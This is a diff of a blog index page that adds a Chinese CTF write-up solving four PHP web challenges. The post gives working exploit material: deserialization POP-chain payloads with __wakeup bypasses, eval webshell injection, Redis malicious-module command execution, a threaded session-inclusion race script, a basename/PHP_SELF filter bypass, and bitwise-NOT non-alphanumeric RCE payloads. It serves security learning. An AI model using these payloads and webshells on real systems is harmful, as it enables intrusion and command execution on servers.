@@ -263,6 +263,204 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/" itemprop="url">NSSCTF练习1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-04T15:23:53+08:00">
+                2022-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>换个平台继续刷，碰到什么做什么，然后记录一些比较有意思或者设计知识盲区的题。</p>
+<h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;&quot;;</span><br><span class="line">    function __call($method,$args)&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;code = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_REQUEST[&#x27;poc&#x27;]))&#123;</span><br><span class="line">    preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret);</span><br><span class="line">    if (isset($ret[1])) &#123;</span><br><span class="line">        foreach ($ret[1] as $i) &#123;</span><br><span class="line">            if(intval($i)!==1)&#123;</span><br><span class="line">                exit(&quot;you want to bypass wakeup ? no !&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[&#x27;poc&#x27;]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>发现pop链，不过这个链是比较简单的，我们利用B类中的<code>__destruct()</code>，B中存在一个a方法，另这个a方法为A类，然后利用魔术方法执行echo指令时由于A类中不存在a方法，因此会调用<code>__call</code>魔术方法执行eval，但是要绕过<code>__wakeup</code>。</p>
+<p>首先写exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new B();</span><br><span class="line">$a -&gt; a = new A();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">//O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于源码中判断了反序列化的属性个数必须为1，这里不能直接改数字绕过，有两种方法：</p>
+<ul>
+<li><p>增加真实属性个数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:1;&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>大小写绕过，由于类名不区分大小写，因此改小写改值就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>查看phpinfo，发现命令执行的指令几乎都被禁止了，那么我们先写入shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:22:&quot;eval($_POST[&#x27;mrl64&#x27;]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，这里学到了要上传恶意so文件来连接redis：<br><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">恶意so文件</a></p>
+<p>接着使用蚁剑的redis插件连接，密码在html目录下的<code>config.php.swp</code>文件中，连接后选择db0执行下面的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD &quot;/var/www/html/exp.so&quot;</span><br><span class="line">system.exec &quot;ls /&quot;</span><br><span class="line">system.exec &quot;cat /f*&quot;</span><br></pre></td></tr></table></figure>
+<p>得到flag，这题综合还是挺难的。</p>
+<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><p>审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">if(!isset($_GET[&#x27;mode&#x27;]))&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;else if($_GET[&#x27;mode&#x27;] == &quot;eval&quot;)&#123; </span><br><span class="line">    $shell = isset($_GET[&#x27;shell&#x27;]) ? $_GET[&#x27;shell&#x27;] : &#x27;phpinfo();&#x27;; </span><br><span class="line">    if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); </span><br><span class="line">    eval($shell); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123; </span><br><span class="line">    if(strlen($_GET[&#x27;file&#x27;]) &gt; 15 | filter($_GET[&#x27;file&#x27;])) exit(&quot;hacker&quot;); </span><br><span class="line">    include $_GET[&#x27;file&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function filter($var)&#123; </span><br><span class="line">    $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;]; </span><br><span class="line"></span><br><span class="line">    foreach($banned as $ban)&#123; </span><br><span class="line">        if(strstr($var, $ban)) return True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    return False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function checkNums($var)&#123; </span><br><span class="line">    $alphanum = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;; </span><br><span class="line">    $cnt = 0; </span><br><span class="line">    for($i = 0; $i &lt; strlen($alphanum); $i++)&#123; </span><br><span class="line">        for($j = 0; $j &lt; strlen($var); $j++)&#123; </span><br><span class="line">            if($var[$j] == $alphanum[$i])&#123; </span><br><span class="line">                $cnt += 1; </span><br><span class="line">                if($cnt &gt; 8) return True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    return False; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看着好像和rce很像，但是这个过滤几乎把rce的路给堵死了，我们看看phpinfo，发现<code>session.use_strict_mode=0</code>，且<code>session.upload_process.cleanup</code>为off，不需要条件竞争。没有<code>session.save_path</code>，文件默认储存在/tmp/sess_xxxx。因此我们可以利用session包含来解题。</p>
+<p>表单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://1.14.71.254:28017/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;&lt;?php eval($_POST[&#x27;mrl64&#x27;]);?&gt;&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随便上传一个文件，记得注意添加cookie：<code>Cookie: PHPSESSID=233</code>，然后蚁剑连接即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28017/?file=/tmp/sess_233</span><br></pre></td></tr></table></figure>
+
+<p>或者大佬们直接用脚本跑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">from cffi.backend_ctypes import xrange</span><br><span class="line"></span><br><span class="line">sessid = &#x27;0&#x27;</span><br><span class="line"></span><br><span class="line">def write(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        resp = session.post( &#x27;http://1.14.71.254:28017/&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )</span><br><span class="line">def read(session):</span><br><span class="line">    while True:</span><br><span class="line">        resp = session.post(f&quot;http://1.14.71.254:28017/?mode=foo&amp;file=/tmp/sess_&#123;sessid&#125;&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;)</span><br><span class="line">        if &#x27;tgao.txt&#x27; in resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[+++++++++++++]retry&quot;)</span><br><span class="line">            #print(resp.text)</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    with requests.session() as session:</span><br><span class="line">        for i in xrange(1,30):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        for i in xrange(1,30):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
+
+<h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &#x27;utils.php&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">    $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">    if ($guess === $secret) &#123;</span><br><span class="line">        $message = &#x27;Congratulations! The flag is: &#x27; . $flag;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $message = &#x27;Wrong. Try Again&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/utils\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;show_source&#x27;])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>我们要做的是上传一个guess变量和secret的值相同，这想想都不可能，因此这个地方完全没用。我们来看下面一串东西：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]：获取当前执行脚本的文件名</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;]：取得当前URL的路径地址</span><br><span class="line">basename()：返回路径中的文件名部分</span><br></pre></td></tr></table></figure>
+
+<p>首先url过滤了<code>show_source</code>，直接url编码绕过就可以了。而关键部分在<code>highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</code>这串上。我们构建payload并开始分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28032/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65</span><br></pre></td></tr></table></figure>
+
+<p>首先获取<code>$_SERVER[&#39;PHP_SELF&#39;]</code>，这个函数所获取到的内容为<code>/index.php/utils.php/%ff</code>，接着<code>basename()</code>会获取路径尾的文件名，即<code>/utils.php/%ff</code>。</p>
+<p>由于文件尾的不可打印字符，可以绕过正则匹配部分，而<code>basename()</code>在获取名称时会自动丢弃不可打印字符，因此成功读取到目标文件，拿到flag。</p>
+<h1 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;wllm&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $wllm = $_GET[&#x27;wllm&#x27;];</span><br><span class="line">    $blacklist = [&#x27; &#x27;,&#x27;\t&#x27;,&#x27;\r&#x27;,&#x27;\n&#x27;,&#x27;\+&#x27;,&#x27;\[&#x27;,&#x27;\^&#x27;,&#x27;\]&#x27;,&#x27;\&quot;&#x27;,&#x27;\-&#x27;,&#x27;\$&#x27;,&#x27;\*&#x27;,&#x27;\?&#x27;,&#x27;\&lt;&#x27;,&#x27;\&gt;&#x27;,&#x27;\=&#x27;,&#x27;\`&#x27;,];</span><br><span class="line">    foreach ($blacklist as $blackitem)</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;</span><br><span class="line">        die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;</span><br><span class="line">eval($wllm);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;蔡总说：注意审题！！！&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>可以看到是一个rce，但是过滤了字母的相当一部分符号，这里就是特殊的无字符webshell了，研究这个的时候发现这一块还挺有意思的，挖个坑之后写篇博客。</p>
+<p>返回来题目，这里发现按位取反没有被过滤，因此直接参考p牛的文章：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无数字字母webshell之提高篇</a></p>
+<p>简单的生成payload脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get(shell):</span><br><span class="line">    hexbit = &#x27;&#x27;.join(map(lambda x:hex(~(-(256-ord(x)))),shell))</span><br><span class="line">    print hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">get(&#x27;phpinfo&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8c%86%8c%8b%9a%92)(~%93%8c%df%d0);</span><br><span class="line">//system(&#x27;ls \&#x27;)</span><br><span class="line"></span><br><span class="line">?wllm=(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%d0%99%93%93%93%93%93%9e%9e%9e%9e%9e%9e%98%98%98%98%98%98%98);</span><br><span class="line">//system(&#x27;cat /flllllaaaaaaggggggg&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/03/buu%E7%BB%83%E4%B9%A04/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1582,154 +1780,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/09/pop%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mrl64's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/02/09/pop%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA/" itemprop="url">pop链的构建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-09T16:04:47+08:00">
-                2022-02-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>反序列化plus之pop链的构建，趁寒假还有点时间就继续学习下。</p>
-</blockquote>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2022/02/09/pop%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1780,7 +1830,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-count">49</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1802,7 +1852,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
